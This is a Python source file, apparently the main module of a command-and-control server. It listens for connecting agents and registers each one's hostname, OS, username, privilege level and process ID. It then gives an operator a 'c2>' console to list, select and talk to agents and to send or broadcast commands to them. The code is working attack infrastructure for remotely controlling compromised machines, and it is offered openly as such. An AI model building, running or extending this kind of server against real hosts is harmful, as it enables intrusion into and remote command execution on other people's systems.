# c2/server/main.py
import socket
import threading
from c2.server.config import HOST, PORT, LOGS_DIRECTORY, MAIN_LOG_FILE
from c2.server.logging_conf import setup_logger
from c2.server.transport import recv_message, send_message
from c2.server.protocol import TYPE_HANDSHAKE
from c2.server.session import SessionRegistry, AgentEntry
from c2.server.cli import CLI
from c2.server.handlers import handle_incoming
from c2.common.models import AgentInfo
from c2.server.cli_recorder import CLISessionRecorder
import os

def handle_client(conn: socket.socket, addr, registry: SessionRegistry, logger):
    logger.info("New connection from %s:%s", addr[0], addr[1])
    msg = recv_message(conn)
    if msg is None or msg.get("type") != TYPE_HANDSHAKE:
        logger.warning("Invalid or missing handshake from %s:%s - closing", addr[0], addr[1])
        try: conn.close()
        except: pass
        return
    p = msg.get("payload", {})

    # Assign first free numeric id
    i = 0
    while str(i) in registry._by_id:
        i += 1

    agent_id = str(i)
    info = AgentInfo(
        id=agent_id,
        addr=f"{addr[0]}:{addr[1]}",
        hostname=p.get("hostname"),
        os=p.get("os"),
        username=p.get("username"),
        privilege=p.get("privilege"),
        pid=p.get("pid")
    )
    entry = AgentEntry(info=info, conn=conn)
    registry.add(entry)
    logger.info("Registered agent %s (%s)", entry.short, info.hostname)

    try:
        while entry.alive:
            msg = recv_message(conn)
            if msg is None:
                logger.info("Agent %s disconnected", entry.short)
                break
            entry.inbox.put(msg)
            summary = handle_incoming(registry, entry, msg, logger)
            if summary:
                logger.debug(summary)
    except Exception as e:
        logger.exception("Connection loop error for %s: %s", entry.short, e)
    finally:
        entry.alive = False
        registry.remove(info.id)
        try: conn.close()
        except: pass
        logger.info("Cleaned up agent %s", entry.short)

def acceptor(sock: socket.socket, registry: SessionRegistry, logger):
    while True:
        try:
            conn, addr = sock.accept()
            t = threading.Thread(
                target=handle_client,
                args=(conn, addr, registry, logger),
                daemon=True
            )
            t.start()
        except Exception as e:
            logger.exception("Acceptor error: %s", e)
            break

def start_server(host, port, logger, registry: SessionRegistry):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(100)
    logger.info("C2 server listening on %s:%d", host, port)

    t = threading.Thread(target=acceptor, args=(s, registry, logger), daemon=True)
    t.start()
    cli = CLI(registry, logger, MAIN_LOG_FILE)
    try:
        cli.print_help()
        while cli.running:
            prompt = "c2> "
            raw = input(prompt)  # user input is not auto-logged by the TTY
            print(f"{prompt}{raw}")  # echo so the recorder captures operator commands
            raw = raw.strip()
            if not raw:
                continue
            parts = raw.split(" ", 1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else None

            if cmd == "help":
                cli.print_help()
            elif cmd == "list":
                cli.list_agents()
            elif cmd == "select":
                if not arg: print("Usage: select <short_id>"); continue
                cli.select_agent(arg)
            elif cmd == "info":
                cli.show_selected_info()
            elif cmd == "send":
                if not arg: print("Usage: send <command>"); continue
                cli.send_command(arg)
            elif cmd == "broadcast":
                if not arg: print("Usage: broadcast <command>"); continue
                cli.broadcast(arg)
            elif cmd == "read":
                if not arg: print("Usage: read <short_id>"); continue
                cli.read_incoming(arg)
            elif cmd == "talk":
                if not arg: print("Usage: talk <short_id>"); continue
                cli.interactive_talk(arg)
            elif cmd == "logs":
                n = 50
                if arg:
                    try: n = int(arg)
                    except: print("Invalid number, using 50.")
                cli.show_logs(n)
            elif cmd in ("quit", "exit"):
                cli.running = False
            else:
                print("Unknown command. Type 'help'.")
    except (EOFError, KeyboardInterrupt):
        print()
    finally:
        try: s.close()
        except: pass
        logger.info("Server stopped.")
def main():
    # Start recorder FIRST, then create logger and registry, then run server and CLI.
    with CLISessionRecorder():
        logger = setup_logger(log_file = MAIN_LOG_FILE) 
        registry = SessionRegistry()
        start_server(HOST, PORT, logger, registry)

if __name__ == "__main__":
    main()
